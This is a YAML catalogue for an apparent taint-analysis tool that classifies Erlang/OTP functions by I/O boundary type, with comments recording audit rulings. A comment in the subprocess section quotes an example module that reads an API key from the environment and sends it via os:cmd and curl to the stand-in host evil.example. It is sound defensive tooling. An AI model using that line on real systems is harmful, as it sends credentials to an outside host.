# SPDX-License-Identifier: AGPL-3.0-or-later
# ADR-0016: I/O primitive catalog for Erlang
#
# Maps Erlang/OTP stdlib modules and functions to I/O boundary types.
# Erlang uses module:function/arity syntax; we list by module and function.
# Third-party libraries (cowboy, ranch, etc.) call these primitives
# transitively, so covering stdlib + OTP is sufficient.
language: erlang
# WI-tukif (Plan C, PR B): catalog audited against erlang.org/doc/man/
# 2026-05-24 for OTP 26. Strict-stdlib coverage: file/filelib/prim_file
# (filesystem), gen_tcp/gen_udp/gen_sctp/ssl (sockets), httpc/httpd (inets
# HTTP), inet (DNS + socket options), ets/dets/mnesia (databases), erlang
# process primitives + gen_server/gen_statem/gen_event/supervisor/proc_lib
# (OTP behaviours), rpc/global (distributed), os/application/init
# (environment), code (loading .beam files), io/logger/error_logger
# (output). digraph_utils / digraph / crypto / random / rand are
# intentionally absent — not IO, and io_lib joined them (INV-nular F6): it
# formats into an iolist and writes nothing. dist_util is internal-only.
status: provenance_declared
stdlib_provenance:
  source_url: https://erlang.org/doc/apps/stdlib/index.html
  version: "26"
  retrieved: "2026-05-24"
  notes: |
    Erlang/OTP I/O primitives derived from erlang.org/doc/apps/stdlib for
    OTP 26 plus the inets and ssl applications. Third-party HTTP servers
    (cowboy/ranch) and clients are intentionally excluded under the
    Plan C strict-stdlib rule; first-party calls surface in
    external_potential via the Plan C, PR C filter. stdlib_other is not
    enumerated yet — populated incrementally as needed.

# Function names that are too generic to match without module context.
# Erlang modules use short, generic names for very different operations.
ambiguous_names:
  - read          # file:read vs any read/1
  - write         # file:write vs any write/2
  - open          # file:open vs gen_tcp:open, any open/1
  - close         # file:close vs gen_tcp:close, any close/1
  - send          # gen_tcp:send vs gen_server:send, Pid ! Msg
  - recv          # gen_tcp:recv vs any recv/2
  - connect       # gen_tcp:connect vs any connect/2
  - accept        # gen_tcp:accept vs any accept/1
  - listen        # gen_tcp:listen vs any listen/2
  - start         # gen_server:start vs application:start, any start/1
  - stop          # gen_server:stop vs application:stop, any stop/1
  - call          # gen_server:call vs any call/2
  - cast          # gen_server:cast vs any cast/2
  - reply         # gen_server:reply vs any reply/2
  - spawn         # erlang:spawn vs any spawn/1
  - link          # erlang:link vs file:make_link
  - delete        # ets:delete vs file:delete, any delete/1
  - lookup        # ets:lookup vs any lookup/2
  - insert        # ets:insert vs any insert/2
  - new           # ets:new vs any new/1
  - get           # application:get_env vs any get/1
  - set           # application:set_env vs any set/2
  - log           # logger:log vs math:log
  - format        # io:format vs any format/2
  - register      # erlang:register vs any register/2
  - monitor       # erlang:monitor vs any monitor/2
  - exit          # erlang:exit vs any exit/1
  - error         # logger:error vs erlang:error

fs_read:
  - module: io
    functions: [read, get_line, get_chars]
    boundary_ruling: call_site_undecidable
    notes: >-
      The file-device arm of the same primitives (INV-nular). See the ipc_recv
      rows for the ruling: `io:read/2` may be handed a file IoDevice, and the
      catalogue cannot tell that from `io:read/1` on standard input.
  - module: file
    functions: [read_file, read, read_line, pread, open, consult, path_consult, eval, script, list_dir, list_dir_all, read_file_info, read_link_info, read_link]
  - module: filelib
    functions: [find_file, find_source, is_dir, is_file, is_regular, file_size, last_modified, fold_files, wildcard]
  # INV-kaduh: split out of the row above and declared `simultaneous` on BOTH
  # sections. `filelib:ensure_dir/1` stats the path and creates whatever
  # parents are missing — one call, both boundaries, and no mode argument
  # anywhere in its signature for anything to disambiguate.
  #
  # Undeclared it looked exactly like `builtins.open`'s genuine dual
  # classification, so the sink derivation gated the fs_write row on an
  # `io_mode` no erlang (or elixir, which inherits this catalogue) analyzer
  # stamps — and `resolve_mode_boundary(None)` is `fs_read`, so the write sink
  # matched nothing at all. `simultaneous` is the declared marker for this
  # third shape; the rows must agree or `simultaneous_boundaries_for` refuses
  # the primitive rather than picking one.
  - module: filelib
    functions: [ensure_dir]
    simultaneous: true
    notes: "Reads to check, writes to create the missing parents; no mode argument exists"
  - module: prim_file
    functions: [read_file, read, list_dir, read_file_info]
    notes: "Low-level file operations; usually called via file module"
  - module: code
    functions: [load_file, ensure_loaded, get_object_code, where_is_file, is_loaded, lib_dir, priv_dir, root_dir, get_path]
    notes: "Code server reads .beam files from disk + resolves application paths"

fs_write:
  - module: file
    functions: [write_file, write, pwrite, truncate, delete, rename, make_dir, del_dir, make_link, make_symlink, change_mode, change_owner, change_group, change_time]
  # See the fs_read section: `ensure_dir` carries `simultaneous` on both rows
  # or the primitive is refused. `ensure_path` is write-only and stays plain.
  - module: filelib
    functions: [ensure_dir]
    simultaneous: true
  - module: filelib
    functions: [ensure_path]

net_send:
  - module: gen_tcp
    functions: [send, connect]
  - module: gen_udp
    functions: [send]
    notes: >-
      INV-vaduk's open question, now ANSWERED and the row removed
      (INV-nular, WI-dosov). `open` appeared under BOTH net_send and
      net_recv, and the row itself recorded why that was incoherent:
      opening a UDP socket enables both directions but "transfers
      nothing at the call itself", while gen_udp send/recv are
      catalogued separately. A socket-ACQUISITION call is not a net_*
      crossing.

      THE DEFERRAL'S REASONING WAS INVERTED, which is why it stood so
      long: "removing them is a recall change and this is a
      precision-band cycle". net_recv is an auto-derived taint SOURCE,
      so this row MINTED untrusted_input at a call that observes
      nothing -- removing it deletes false positives, which is what a
      precision-band cycle is for. The same holds on the net_send side:
      a sink at a call that emits nothing is a false egress claim. Both
      real transfers stay rowed, so nothing real was relocated.
  - module: gen_sctp
    functions: [send, connect]
  - module: ssl
    functions: [send, connect]
  - module: httpc
    functions: [request]
    notes: "inets HTTP client"
  # `http_client` REMOVED (ADR-0047 ruling 8, WI-surun). There is no OTP
  # module by that name -- inets' client is `httpc`, one row above, and
  # this was a phantom sitting beside it since the catalogue was written.
  # It is DELETED rather than relocated to a community overlay, because an
  # overlay row would assert that some package provides `http_client:request/1`
  # and none does. The rule for removing a net_send row is "is the crossing
  # still represented", not "does this call do the I/O" (WI-lunav): it is,
  # by `httpc.request`. Positive evidence, not absence of evidence -- on
  # ejabberd and emqx, `http_client` matched 0 times while `httpc` matched
  # 10 and 9. A first-party module a project happens to name `http_client`
  # was being classified as network egress on the strength of its name.

net_recv:
  - module: gen_tcp
    functions: [recv, accept]
  - module: gen_udp
    functions: [recv]
    notes: >-
      INV-vaduk's open question, now ANSWERED and the row removed
      (INV-nular, WI-dosov). `open` appeared under BOTH net_send and
      net_recv, and the row itself recorded why that was incoherent:
      opening a UDP socket enables both directions but "transfers
      nothing at the call itself", while gen_udp send/recv are
      catalogued separately. A socket-ACQUISITION call is not a net_*
      crossing.

      THE DEFERRAL'S REASONING WAS INVERTED, which is why it stood so
      long: "removing them is a recall change and this is a
      precision-band cycle". net_recv is an auto-derived taint SOURCE,
      so this row MINTED untrusted_input at a call that observes
      nothing -- removing it deletes false positives, which is what a
      precision-band cycle is for. The same holds on the net_send side:
      a sink at a call that emits nothing is a false egress claim. Both
      real transfers stay rowed, so nothing real was relocated.
  - module: gen_sctp
    functions: [recv]
  - module: ssl
    functions: [recv, transport_accept]
    notes: >-
      `handshake` MOVED to net_listen (ADR-0049, measurement 0010): it upgrades
      an accepted transport socket and returns {ok, SslSocket} -- a handle, not
      a byte. transport_accept returns the peer's socket and recv returns the
      bytes, so both stay.
  - module: inet
    functions: [getaddr, getaddrs, gethostbyname, gethostbyaddr, gethostname, getservbyname, getservbyport]
    notes: "DNS resolution and service-name lookups (queries name servers)"

# ADR-0049 DEFERRED CROSSINGS. The call ARRANGES a crossing whose data arrives
# in a scope it does not name; net_listen mints no taint and shadows net_recv,
# so the crossing is DISCLOSED rather than either minted or silently dropped.
net_listen:
  - module: httpd
    functions: [start, start_service]
    notes: >-
      LAUNCH (ADR-0049 ruling 4 row 2, measurement 0010). inets starts serving;
      the request reaches the configured mod_* callback, not this caller.
      gen_tcp:accept/recv stay net_recv and carry the real receive -- the
      represented-crossing probe confirms both still fire after this move.
  - module: ssl
    functions: [handshake]
    notes: >-
      SETUP. Upgrades an accepted transport socket and returns {ok, SslSocket}
      -- a handle, not a byte. ssl:transport_accept returns the peer's socket
      and ssl:recv returns the bytes; both stay net_recv.

db_read:
  - module: ets
    functions: [lookup, lookup_element, match, match_object, select, select_reverse, first, next, last, prev, foldl, foldr, tab2list, info, member]
  - module: dets
    functions: [lookup, match, match_object, select, first, next, foldl, foldr, traverse, open_file]
  - module: mnesia
    functions: [read, match_object, select, first, next, last, prev, all_keys, table_info, dirty_read, dirty_match_object, dirty_select, dirty_first, dirty_next, dirty_last, dirty_prev, dirty_all_keys]

db_write:
  - module: ets
    functions: [insert, insert_new, delete, delete_object, delete_all_objects, update_counter, update_element, new]
  - module: dets
    functions: [insert, insert_new, delete, delete_object, delete_all_objects]
  - module: mnesia
    functions: [write, delete, delete_object, dirty_write, dirty_delete, dirty_delete_object, dirty_update_counter, create_table, delete_table, add_table_index, add_table_copy, transaction, async_dirty, sync_dirty]

process_send:
  - module: erlang
    functions: [send, "!", send_after, send_nosuspend, spawn, spawn_link, spawn_monitor, spawn_opt, exit, register, unregister, monitor, demonitor, link, unlink, process_flag]
    notes: "Core process primitives. ! is the send operator but resolved as erlang:send/2"
  - module: gen_server
    functions: [call, cast, multi_call, abcast, reply, start, start_link, start_monitor, stop]
  - module: gen_statem
    functions: [call, cast, start, start_link, start_monitor, stop, reply]
  - module: gen_event
    functions: [notify, sync_notify, call, start, start_link, start_monitor, stop, add_handler, add_sup_handler, delete_handler]
  - module: supervisor
    functions: [start_link, start_child, restart_child, delete_child, terminate_child, which_children, count_children]
  - module: proc_lib
    functions: [spawn, spawn_link, spawn_opt, start, start_link, init_ack, hibernate]
  - module: rpc
    functions: [call, block_call, cast, multicall, parallel_eval, async_call, yield, nb_yield]
    notes: "Distributed Erlang RPC"
  - module: global
    functions: [send, register_name, re_register_name, unregister_name, whereis_name]

# ---------------------------------------------------------------------------
# Subprocess — the BEAM's process-launch surface (WI-jupaf).
#
# This section did not exist. erlang.yaml was the only one of the fourteen
# shipped catalogues with no `subprocess:` key at all, so Erlang's entire
# process-launch surface was unrepresented — and `os:cmd`, the shell-out
# itself, was filed under env_read + env_write beside getenv/putenv.
#
# THAT IS A FALSE CONFIRM, NOT A RECALL MISS, and it was measured on the
# shipped CLI: a module whose whole body is
#     Secret = os:getenv("API_KEY"),
#     os:cmd("curl -d " ++ Secret ++ " https://evil.example/p")
# answered `{boundary: subprocess, must_not_exist: true}` with **confirmed,
# rc 0, "No subprocess chains found."** The call was never invisible — it was
# CLASSIFIED, as env_read, and since INV-buzab a classified call is what
# `examined` means, so the exfiltration counted as an examined negative for the
# boundary that was actually true.
#
# Elixir inherits this file (child-over-parent, as scala does java), so an
# Elixir program calling the idiomatic-interop `:os.cmd/1` was in the same
# state; the fix lands once here rather than being repeated in elixir.yaml,
# and a parity test asserts the inherited answer.
subprocess:
  - module: os
    functions: [cmd]
    simultaneous: true
    notes: >-
      os:cmd/1 runs a command through the OS shell and returns its output.
      Opaque by the ADR-0016 rule that a launch's own I/O is not in the edge
      set: what `curl` does is invisible here, which is why the boundary must
      be `subprocess` (INV-gahuz's opacity gate keys on it) rather than a
      data-I/O category that would assert something specific and wrong.
  - module: erlang
    functions: [open_port]
    notes: >-
      erlang:open_port/2 is the primitive os:cmd/1 is implemented on top of,
      and it was catalogued NOWHERE — producing no chain of any kind. Its
      `{spawn, Command}` and `{spawn_executable, Path}` forms launch an
      external program.

env_read:
  - module: os
    functions: [getenv]
    notes: "WI-jupaf: `cmd` was REMOVED from this list. os:cmd/1 is the BEAM shell-out, not an environment read — it was swept in with the rest of the os module and now lives under `subprocess:` below. It is removed rather than ALSO declared there, because a multi-boundary primitive is resolved by YAML row order (INV-zumin), which would make the correct declaration live or inert depending on where it was pasted."
  - module: application
    functions: [get_env, get_all_env, get_key, get_all_key]
    notes: "Application config reads. Ruled and kept under env_read with elixir's Application.get_env (INV-nular, 2026-09-06): the boundary means 'may carry a credential', and application config is where runtime.exs / sys.config put credentials. The full ruling is on the elixir row."
  - module: init
    functions: [get_argument, get_arguments, get_plain_arguments]

# INV-tutar: host DESCRIPTION reads. Split out of env_read because
# AUTO_SOURCE_LABEL_MAP derives a taint LABEL from the boundary, and
# calling runtime.GOOS or platform.system a host SECRET made every
# host-secret-* claim count description reads as secret flows.
host_info_read:
  - module: erlang
    functions: [monotonic_time, system_time, timestamp, time_offset, localtime, universaltime]
    notes: >-
      WI-tubij: a clock read is host_info_read in EVERY catalogued language
      (WI-pavob ruling 2026-08-26, "yes in"). A monotonic clock counts: on
      Linux CLOCK_MONOTONIC runs from boot, so an early read leaks
      approximate uptime, which distinguishes machines. Arithmetic on an
      already-captured value is NOT a read and is refused. erlang/otp
      erts/preloaded/src/erlang.erl. convert_time_unit is pure arithmetic
      and gets no row. INHERITED BY elixir.
  - module: os
    functions: [timestamp]
    notes: >-
      os:timestamp/0 was MISSING while its siblings os:system_time and
      os:perf_counter were already catalogued — found by enumerating
      lib/kernel/src/os.erl rather than trusting the existing rows.
  - module: os
    functions: [type, version, system_time, perf_counter]
    notes: "WI-jupaf: `cmd` was REMOVED from this list. os:cmd/1 is the BEAM shell-out, not an environment read — it was swept in with the rest of the os module and now lives under `subprocess:` below. It is removed rather than ALSO declared there, because a multi-boundary primitive is resolved by YAML row order (INV-zumin), which would make the correct declaration live or inert depending on where it was pasted."
  - module: application
    functions: [get_application, loaded_applications, which_applications, info]
  - module: init
    functions: [get_status, script_id]

env_write:
  - module: os
    functions: [putenv, unsetenv]
    notes: "WI-jupaf: `cmd` removed here too — see the env_read note above."
  - module: application
    functions: [set_env, unset_env, load, start, stop, ensure_started, ensure_all_started]

ipc_recv:
  - module: os
    functions: [cmd]
    simultaneous: true
    notes: >-
      INV-lozat / ADR-0049 ruling 1: returns the CHILD'S output, so the call is
      a transfer as well as a launch and mints an untrusted_input source. Both
      facts are true at once (the `scala.sys.process.Process.apply` shape), so
      `simultaneous` is required -- without it `io_boundaries` is unwritten and
      the subprocess chain loses the race to `ipc_recv`, which parses first.
      The siblings that return only an exit status or a HANDLE stay
      launch-only: a status is not the child's message, and a handle is a
      crossing that has not happened yet (the ADR-0049 deferred shape).
      Follows rust.yaml's `Child.wait_with_output`, which follows python.yaml's
      `os.wait`.
  - module: io
    functions: [read, get_line, get_chars]
    boundary_ruling: call_site_undecidable
    notes: >-
      Reads an Erlang term / line / chars from an IoDevice (INV-nular). These
      were declared `logging`, an OUTBOUND sink, which was wrong twice over: a
      tainted value "reaching logging" fired at a call that emits nothing, and
      the data actually read was not a taint SOURCE at all, so the most
      ordinary untrusted input a program has was invisible.

      THE DIRECTION IS UNAMBIGUOUS; WHICH INBOUND BOUNDARY IS NOT, which is why
      these carry a ruling rather than one boundary. `io:read/1` reads STANDARD
      INPUT (ipc_recv, following the C precedent where a bare `stdin` classifies
      that way); `io:read/2` reads from a given IoDevice, which may be a FILE
      (fs_read). The catalogue matches on NAME, not arity, so exactly one is
      true per call site and the call site cannot tell which — INV-vaduk's
      `call_site_undecidable`, the same shape as C's `unistd.write`.

      The sibling elixir `IO` module rows `read`/`gets`/`getn` as fs_read only,
      which is the other half of this ambiguity picked without a ruling. Left
      as is here rather than changed in passing.

logging:
  - module: io
    functions: [format, fwrite, put_chars, nl, write]
    notes: >-
      io:format is Erlang's printf equivalent. `read`, `get_line` and
      `get_chars` were HERE and have moved to ipc_recv (INV-nular): they read
      from standard input, and `logging` is an outbound SINK. Declaring an
      input as an output got it wrong twice — a tainted value "reaching
      logging" fired at a call that emits nothing, and the data actually read
      from stdin was not a taint SOURCE at all, so the most ordinary untrusted
      input a program has was invisible.
# io_lib: DELETED (INV-nular F6, measurement 0006 sensitivity S1).
#
# `io_lib:format/2` returns an iolist. It writes nothing. Erlang splits io_lib
# from io for exactly that reason, and this row's own note conceded it --
# "Returns iolist, not direct I/O, but typically written immediately" -- while
# AUTO_SINK_ZONE_MAP turned `logging` into a taint SINK at every call site.
#
# ADJACENCY IS NOT A CROSSING. A boundary tag asserts the crossing happens AT
# THIS CALL, in this call's scope (ADR-0049 ruling 1). "Typically written
# immediately" describes a DIFFERENT call, one hop later -- which is rowed
# above as `io:format`, so the crossing is represented and ruling 3 licenses
# the removal.
#
# THE REMOVAL IS CORRECT; ONE ARGUMENT FIRST OFFERED FOR IT WAS NOT. A cold A/B
# on rabbitmq showed `host-secret-no-logging` still violated, 100 -> 68 flows,
# sink modules io_lib 94 -> 0 and io 5 -> 64, with measurement 0006's three
# adjudicated true positives appearing to "re-root" onto io:format. That was
# read as ruling 3's represented-crossing test being met. A BLIND PANEL REFUTED
# IT (two independent passes, 0/7 disagreement, 2026-08-30): the re-rooted
# route terminates at rabbit_misc:module_attributes/1, whose io:format takes
# only [Module] -- bound from application:get_key -- so no source value reaches
# it. The removal therefore deleted VACUOUS findings rather than relocating
# real ones, which is still the right outcome and is why the row is gone.
# Measurement 0006's sensitivity S1 STANDS; useful precision under it is 21.4%.
# The vanished shape is `rabbit_misc:format/2` = lists:flatten(io_lib:format(
# ...)), a pure function whose result is returned in an {error, _} tuple.
#
# NOT AN ARGUMENT FOR KEEPING IT: some vanished flows were real, logging via
# ?LOG_DEBUG -- an OTP macro the analyzer does not expand. rabbitmq has 1,910
# ?LOG_* uses against 187 direct `logger:` calls, so io_lib was covering that
# gap BY COINCIDENCE. The macro gap is filed; a wrong row is not its fix.
  - module: error_logger
    functions: [info_msg, info_report, warning_msg, warning_report, error_msg, error_report]
    notes: "Legacy logging; replaced by logger in OTP 21+"
  - module: logger
    functions: [emergency, alert, critical, error, warning, notice, info, debug, log]
    notes: "OTP 21+ logging framework"
